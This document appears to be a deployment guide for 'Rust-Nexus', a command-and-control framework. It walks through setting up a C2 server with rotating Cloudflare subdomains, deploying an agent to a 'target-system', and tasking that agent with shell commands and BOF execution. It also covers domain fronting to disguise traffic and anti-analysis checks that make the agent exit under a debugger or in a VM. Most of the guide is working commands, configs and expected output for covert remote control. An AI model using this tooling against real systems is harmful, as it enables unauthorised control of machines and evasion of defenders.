# Basic Deployment Example

This example demonstrates a simple Rust-Nexus deployment with Cloudflare DNS integration and Let's Encrypt certificates.

## Scenario

Deploy a basic C2 infrastructure with:
- Single server instance
- Cloudflare-managed domain
- Automated certificate provisioning
- 2-3 rotating subdomains
- Basic agent deployment

## Prerequisites

- Cloudflare account with domain `example.com`
- Server with public IP `203.0.113.10`
- Cloudflare API token with DNS edit permissions

## Configuration

### 1. Server Configuration (`server.toml`)

```toml
[cloudflare]
api_token = "your_api_token_here"
zone_id = "your_zone_id_here"  
domain = "example.com"
proxy_enabled = true
ttl = 300

[letsencrypt]
contact_email = "admin@example.com"
challenge_type = "Dns01"
cert_renewal_days = 30
wildcard_enabled = true
cert_storage_dir = "./certs"

[grpc_server]
bind_address = "0.0.0.0"
port = 443
mutual_tls = false  # Simplified for basic deployment
max_connections = 100

[domains]
primary_domains = ["c2.example.com"]
rotation_interval = 24
max_subdomains = 3

[security]
additional_encryption = true
```

### 2. Agent Configuration (`agent.toml`)

```toml
[connection]
# Will be populated automatically by infrastructure
primary_endpoints = []
backup_endpoints = []
connection_timeout = 10
retry_attempts = 3

[execution]
fiber_execution = true
bof_support = true
anti_analysis = true

[security]
vm_detection = true
debugger_detection = true
```

## Deployment Steps

### 1. Build Framework

```bash
# Clone repository
git clone https://github.com/your-org/rust-nexus.git
cd rust-nexus

# Build release binaries
cargo build --release
```

### 2. Initialize Infrastructure

```bash
# Copy configuration
cp examples/basic-deployment/server.toml ./nexus.toml

# Edit with your Cloudflare details
vim nexus.toml

# Initialize infrastructure
./target/release/nexus-infra setup --config nexus.toml
```

**Expected Output:**
```
[INFO] Initializing Nexus infrastructure...
[INFO] Verifying Cloudflare access for zone: example.com
[INFO] Successfully verified access to zone: example.com (zone_id)
[INFO] Detected public IP: 203.0.113.10
[INFO] Creating initial domains...
[INFO] Creating new C2 domain: abc12345.example.com
[INFO] Successfully created DNS record: A abc12345.example.com -> 203.0.113.10
[INFO] Initializing Let's Encrypt ACME account
[INFO] Creating new ACME account
[INFO] Requesting certificate for domain: *.example.com
[INFO] Creating DNS challenge record: _acme-challenge.example.com = challenge_value
[INFO] Waiting for DNS propagation...
[INFO] DNS challenge record propagated successfully
[INFO] Certificate saved to: ./certs/wildcard.example.com.crt
[INFO] Infrastructure initialized successfully!
```

### 3. Start C2 Server

```bash
# Start the gRPC server
./target/release/nexus-server --config nexus.toml
```

**Expected Output:**
```
[INFO] Starting Nexus C2 Server
[INFO] Loading configuration from: nexus.toml
[INFO] Initializing certificate manager
[INFO] Successfully loaded certificates and private key
[INFO] Starting gRPC server on 0.0.0.0:443
[INFO] gRPC server started successfully on 0.0.0.0:443
[INFO] Ready to accept agent connections
```

### 4. Verify Infrastructure

```bash
# Check domain health
./target/release/nexus-infra domains health --config nexus.toml

# Check certificate status  
./target/release/nexus-infra certificates status --config nexus.toml

# Test DNS resolution
dig abc12345.example.com

# Test TLS connection
openssl s_client -connect abc12345.example.com:443
```

## Agent Deployment

### 1. Generate Agent Configuration

```bash
# Generate agent config with current domains
./target/release/nexus-infra agent-config --output agent.toml --config nexus.toml
```

**Generated `agent.toml`:**
```toml
[connection]
primary_endpoints = ["https://abc12345.example.com:443"]
backup_endpoints = ["https://c2.example.com:443"]
connection_timeout = 10
retry_attempts = 3

[security]
ca_certificate = """
-----BEGIN CERTIFICATE-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END CERTIFICATE-----
"""

[execution]
capabilities = ["fiber", "bof", "injection"]
```

### 2. Deploy Agent

```bash
# Copy agent to target system
scp ./target/release/nexus-agent target-system:/tmp/
scp agent.toml target-system:/tmp/

# On target system:
chmod +x /tmp/nexus-agent
/tmp/nexus-agent --config /tmp/agent.toml
```

**Expected Agent Output:**
```
[INFO] Nexus Agent starting...
[INFO] Loading configuration from: /tmp/agent.toml
[INFO] Connecting to C2 server: https://abc12345.example.com:443
[INFO] Registering agent with C2 server
[INFO] Agent registration successful: agent-uuid-here
[INFO] Starting main agent loop
[INFO] Heartbeat sent, next in 30 seconds
```

## Testing Basic Operations

### 1. Verify Agent Connection

On the server, check connected agents:
```bash
# List connected agents
./target/release/nexus-server agents list

# Get agent details
./target/release/nexus-server agents info agent-uuid-here
```

### 2. Execute Basic Commands

```bash
# Execute shell command
./target/release/nexus-server tasks assign agent-uuid-here shell "whoami"

# Check task result
./target/release/nexus-server tasks results --agent agent-uuid-here

# Execute system info collection
./target/release/nexus-server tasks assign agent-uuid-here system_info
```

### 3. Test BOF Execution

```bash
# Upload BOF file
./target/release/nexus-server files upload examples/bofs/whoami.obj

# Execute BOF
./target/release/nexus-server tasks assign agent-uuid-here bof_execution \
  --bof-file whoami.obj --function go --args "target_system"

# Check BOF result
./target/release/nexus-server tasks results --agent agent-uuid-here --type bof_execution
```

## Domain Rotation Demo

### 1. Manual Domain Rotation

```bash
# Rotate domains immediately
./target/release/nexus-infra domains rotate --config nexus.toml

# Check new domains
./target/release/nexus-infra domains list --config nexus.toml
```

**Expected Output:**
```
[INFO] Performing domain rotation
[INFO] Creating new C2 domain: xyz67890.example.com
[INFO] Successfully created DNS record: A xyz67890.example.com -> 203.0.113.10
[INFO] Cleaning up old domains
[INFO] Successfully removed domain: abc12345.example.com
[INFO] Domain rotation completed, created 1 new domains

Active Domains:
- xyz67890.example.com -> 203.0.113.10 (created: 2024-01-15 10:30:00 UTC)
- c2.example.com -> 203.0.113.10 (created: 2024-01-15 09:15:00 UTC)
```

### 2. Automatic Agent Update

The agent will automatically receive new domain information in the next heartbeat:

```
[INFO] Heartbeat response received
[INFO] New domains provided: ["xyz67890.example.com", "c2.example.com"]
[INFO] Updated connection endpoints
[INFO] Next heartbeat in 30 seconds
```

## Monitoring Setup

### 1. Basic Health Monitoring

```bash
# Create monitoring script
cat > scripts/basic-monitor.sh << 'EOF'
#!/bin/bash

echo "=== Nexus Infrastructure Health ==="

# Check server process
if pgrep -f nexus-server > /dev/null; then
    echo "✓ Server process running"
else
    echo "✗ Server process not running"
fi

# Check domain health
./target/release/nexus-infra domains health --config nexus.toml

# Check certificate status
./target/release/nexus-infra certificates status --config nexus.toml

# Check agent connections
AGENT_COUNT=$(./target/release/nexus-server agents list --count)
echo "Active agents: $AGENT_COUNT"

EOF

chmod +x scripts/basic-monitor.sh
```

### 2. Log Monitoring

```bash
# Monitor server logs
tail -f logs/nexus-server.log | grep -E "(ERROR|WARN|agent)"

# Monitor infrastructure logs  
tail -f logs/nexus-infra.log | grep -E "(certificate|domain|ERROR)"
```

## Scaling the Basic Deployment

### 1. Add Additional Domains

```toml
# Update server.toml
[domains]
primary_domains = ["c2.example.com", "api.example.com"]
backup_domains = ["backup.example.com", "cdn.example.com"]
max_subdomains = 5  # Increase subdomain limit
```

### 2. Enable Mutual TLS

```bash
# Generate client certificates
./target/release/nexus-infra certificates generate-client \
  --agent-id agent-template --config nexus.toml

# Update server configuration
vim nexus.toml  # Set mutual_tls = true

# Restart server
sudo systemctl restart nexus-server
```

### 3. Add Load Balancing

```bash
# Configure Cloudflare load balancing
curl -X POST "https://api.cloudflare.com/client/v4/user/load_balancers/pools" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{
    "name": "nexus-c2-pool",
    "origins": [
      {"name": "server1", "address": "203.0.113.10", "enabled": true},
      {"name": "server2", "address": "203.0.113.20", "enabled": true}
    ],
    "monitor": "health-check-monitor-id"
  }'
```

## Troubleshooting

### Common Issues

#### Agent Not Connecting
```bash
# Check DNS resolution from agent
nslookup abc12345.example.com

# Verify TLS connectivity
openssl s_client -connect abc12345.example.com:443

# Check agent logs
./nexus-agent --config agent.toml --debug
```

#### Certificate Issues
```bash
# Check certificate validity
openssl x509 -in certs/wildcard.example.com.crt -noout -dates

# Verify certificate chain
openssl verify -CAfile certs/chain.pem certs/wildcard.example.com.crt

# Re-request certificate if needed
./target/release/nexus-infra certificates request example.com --force
```

#### Domain Rotation Problems
```bash
# Check Cloudflare API connectivity
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/user/tokens/verify"

# Manual domain creation
./target/release/nexus-infra domains create test123 --config nexus.toml

# Check domain health
./target/release/nexus-infra domains health --config nexus.toml
```

## Security Validation

### 1. TLS Configuration Test

```bash
# Test TLS protocols and ciphers
testssl.sh abc12345.example.com:443

# Verify certificate chain
openssl s_client -connect abc12345.example.com:443 -showcerts
```

### 2. Domain Fronting Test

```bash
# Test domain fronting
curl -H "Host: abc12345.example.com" https://cloudflare-cdn.com/

# Verify traffic appears legitimate
tcpdump -i eth0 host cloudflare-cdn.com
```

### 3. Anti-Analysis Verification

```bash
# Test VM detection
./target/release/nexus-agent --test-vm-detection

# Test debugger detection
gdb ./target/release/nexus-agent
# Agent should exit when debugger detected
```

## Next Steps

Once the basic deployment is working:

1. **[Production Hardening](../configuration/security-hardening.md)** - Enhance security
2. **[Enterprise Deployment](../examples/enterprise-deployment/)** - Scale up infrastructure  
3. **[Monitoring Setup](../operations/monitoring.md)** - Comprehensive monitoring
4. **[BOF Development](../execution/bof-guide.md)** - Create custom BOFs
